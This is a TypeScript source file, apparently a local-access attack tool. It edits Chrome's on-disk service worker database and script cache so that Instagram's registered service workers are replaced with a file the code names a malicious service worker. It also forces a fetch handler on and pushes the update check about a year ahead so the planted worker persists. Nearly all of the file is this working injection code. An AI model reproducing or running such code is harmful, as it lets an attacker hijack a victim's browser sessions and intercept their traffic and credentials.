import { diskCache } from "./diskCache"
import { getRegistrations, saveRegistrationEntries, setDbPath } from "./levelDb/serviceWorkerLevelDb"
import * as fs from 'fs'

const chromeServiceWorkerDir = String.raw`C:\Users\maxmf\AppData\Local\Google\Chrome\User Data\Default\Service Worker`
// Set up file paths
diskCache.setFileBase(chromeServiceWorkerDir + String.raw`\ScriptCache`)
setDbPath(chromeServiceWorkerDir + String.raw`\Database`)

async function injectMaliciousServiceWorker() {
    const basicMaliciousServiceWorker = fs.readFileSync("dist/serviceWorker/sw.js", "utf-8")

    const registrations = await getRegistrations("https://www.instagram.com/")
    for(let registration of registrations) {
        const newScriptUrl = registration.registration.value.getScriptUrl()!.replace(/\/[^\/]+$/, "/invalid.js")
        registration.registration.value.setScriptUrl(newScriptUrl)
        registration.registration.value.setHasFetchHandler(true)

        // About a year from now
        //TODO: Replace with a smarter solution. Uses windows epoch
        registration.registration.value.setLastUpdateCheckTime(13325671046262602)
        console.log(registration.registration.value.toObject())

        for(let {value: resourceRecord} of registration.resourceRecords) {
            resourceRecord.setUrl(newScriptUrl)
            console.log(resourceRecord.toObject())
            const diskCacheKey = `${resourceRecord.getResourceId()}`
            const serviceWorkerContent =  await diskCache.get(diskCacheKey, diskCache.Streams.ServiceWorkerScriptContent)
            serviceWorkerContent.body.value = basicMaliciousServiceWorker
            console.log(serviceWorkerContent.body.value)
            await serviceWorkerContent.save()
            await diskCache.remove(diskCacheKey, diskCache.Streams.ServiceWorkerMetadata)
        }

        await saveRegistrationEntries(registration.registration, ...registration.resourceRecords)
    }
}
injectMaliciousServiceWorker()


// async function testDiskCache() {
//     const registrations = await getRegistrations("https://www.instagram.com/")
//     for(let registration of registrations) {
//         for(let {value: resourceRecord} of registration.resourceRecords) {
//             const diskCacheKey = `${resourceRecord.getResourceId()}`
//             const serviceWorkerRequestInfo =  await diskCacheGet(diskCacheKey, Streams.ServiceWorkerRequestInfo)
//             const json = JSON.stringify(serviceWorkerRequestInfo, (key, value) =>
//                 typeof value === "bigint" ? value.toString() + "n" : value
//             , 2);
//             console.log(json)
//             // console.log(util.inspect(serviceWorkerRequestInfo, false, null, true /* enable colors */))
//         }
//     }
// }

// testDiskCache()